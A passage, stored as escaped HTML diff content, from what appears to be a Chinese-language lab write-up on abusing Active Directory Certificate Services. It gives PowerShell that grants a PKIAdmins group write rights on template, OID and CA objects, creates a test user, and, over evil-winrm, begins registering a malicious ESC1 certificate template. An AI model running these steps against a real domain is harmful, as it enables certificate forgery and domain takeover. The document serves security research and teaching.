+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$account &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; New-Object System.Security.Principal.NTAccount&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;WACKADCS\PKIAdmins&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$sid     &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $account.Translate&lt;span style=&#34;color:#f92672&#34;&gt;([&lt;/span&gt;System.Security.Principal.SecurityIdentifier&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ACE 构造函数（6参数）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; Add-PKIAdminACE&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$path, $rights&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $acl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Get-ACL &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:&lt;/span&gt;$path&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $ace &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; New-Object System.DirectoryServices.ActiveDirectoryAccessRule&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $sid,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $rights,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;System.Security.AccessControl.AccessControlType&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::Allow,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;GUID&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::Empty,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;System.DirectoryServices.ActiveDirectorySecurityInheritance&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::None,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;GUID&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::Empty
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $acl.AddAccessRule&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ace&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Set-ACL &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:&lt;/span&gt;$path&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; $acl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#  Certificate Templates 容器权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Add-PKIAdminACE -path $TemplateCN -rights &lt;span style=&#34;color:#f92672&#34;&gt;([&lt;/span&gt;System.DirectoryServices.ActiveDirectoryRights&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::CreateChild -bor &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;System.DirectoryServices.ActiveDirectoryRights&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::WriteProperty&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# OID 容器权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Add-PKIAdminACE -path $OIDCN -rights &lt;span style=&#34;color:#f92672&#34;&gt;([&lt;/span&gt;System.DirectoryServices.ActiveDirectoryRights&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::CreateChild -bor &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;System.DirectoryServices.ActiveDirectoryRights&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::WriteProperty&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# CA 对象权限（允许写入 certificateTemplates 属性）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;foreach &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$CA in $CAs&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $CAPath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $CA.DistinguishedName
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Add-PKIAdminACE -path $CAPath -rights &lt;span style=&#34;color:#f92672&#34;&gt;([&lt;/span&gt;System.DirectoryServices.ActiveDirectoryRights&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::WriteProperty&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 可选：检查权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;foreach &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$CA in $CAs&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Write-Host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==== &lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;$CA.Name&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ====&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Get-ACL &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;$CA.DistinguishedName&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Select-Object -ExpandProperty Access |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Where-Object &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;$_.IdentityReference -like &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*PKIAdmins*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 可选：检查模板和 OID 容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Write-Host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=== Certificate Templates ===&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ACL &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:&lt;/span&gt;$TemplateCN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; | Select-Object -ExpandProperty Access | Where-Object &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;$_.IdentityReference -like &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*PKIAdmins*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Write-Host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=== OID Container ===&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ACL &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:&lt;/span&gt;$OIDCN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; | Select-Object -ExpandProperty Access | Where-Object &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;$_.IdentityReference -like &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*PKIAdmins*&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用域管权限执行后可以看到效果正常，一个可以用于利用，常见的pkiadmin组就被创建好了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; powershell .&lt;span style=&#34;color:#ae81ff&#34;&gt;\m&lt;/span&gt;ake_pkiadmins.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;====&lt;/span&gt; wackadcs-DC-CA &lt;span style=&#34;color:#f92672&#34;&gt;====&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ActiveDirectoryRights : WriteProperty
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritanceType       : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectType            : 00000000-0000-0000-0000-000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectFlags           : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AccessControlType     : Allow
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IdentityReference     : WACKADCS&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;KIAdmins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IsInherited           : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritanceFlags      : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PropagationFlags      : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; Certificate Templates &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ActiveDirectoryRights : CreateChild, WriteProperty
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritanceType       : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectType            : 00000000-0000-0000-0000-000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectFlags           : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AccessControlType     : Allow
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IdentityReference     : WACKADCS&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;KIAdmins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IsInherited           : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritanceFlags      : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PropagationFlags      : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; OID Container &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ActiveDirectoryRights : CreateChild, WriteProperty
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritanceType       : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectType            : 00000000-0000-0000-0000-000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectFlags           : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AccessControlType     : Allow
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IdentityReference     : WACKADCS&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;KIAdmins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IsInherited           : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritanceFlags      : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PropagationFlags      : None
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来我创建了一个testuser用于测试远程攻击，将其添加入pkiadmin以及远程管理组&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt; $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wacky123!@#&amp;#34;&lt;/span&gt; -AsPlainText -Force
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt; New-ADUser -Name $userName &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;            -SamAccountName $userName &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;            -AccountPassword $password &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;            -Enabled $true &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;            -Path $ou
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt; Add-ADGroupMember -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PKIAdmins&amp;#34;&lt;/span&gt; -Members $userName
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt; Add-ADGroupMember -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Remote Desktop Users&amp;#34;&lt;/span&gt; -Members $userName
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt; Add-ADGroupMember -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Remote Management Users&amp;#34;&lt;/span&gt; -Members $userName
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;注册恶意模板&#34;&gt;注册恶意模板
+&lt;/h3&gt;&lt;p&gt;当我们利用testuser权限winrm登陆机器的时候，就可以一步一步注册模板了&lt;/p&gt;
+&lt;p&gt;首先创建OID对象&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; $OIDProps &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; @&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DisplayName&amp;#39;&lt;/span&gt;             &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ESC1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Cert-Template-OID&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flags&amp;#39;&lt;/span&gt;                   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; New-ADObject -Path $OIDPath -Name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ESC1&amp;#39;&lt;/span&gt; -Type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Enterprise-Oid&amp;#39;&lt;/span&gt; -OtherAttributes $OIDProps
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后创建证书模板对象&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; $TemplatePath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Certificate Templates,CN=Public Key Services,CN=Services,&lt;/span&gt;$ConfigNC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; $TemplateProps &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; @&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;displayName&amp;#39;&lt;/span&gt;                   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ESC1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msPKI-Cert-Template-OID&amp;#39;&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flags&amp;#39;&lt;/span&gt;                         &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;131616&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;revision&amp;#39;&lt;/span&gt;                      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
